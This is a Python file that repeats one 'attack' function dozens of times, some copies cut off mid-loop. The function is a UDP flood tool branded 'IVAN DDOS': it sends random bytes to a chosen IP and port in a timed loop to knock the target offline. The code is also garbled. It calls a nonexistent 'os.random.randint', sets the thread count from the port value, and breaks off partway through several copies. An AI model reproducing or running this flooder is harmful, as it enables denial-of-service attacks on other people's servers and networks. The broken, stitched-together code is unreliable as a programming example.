def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
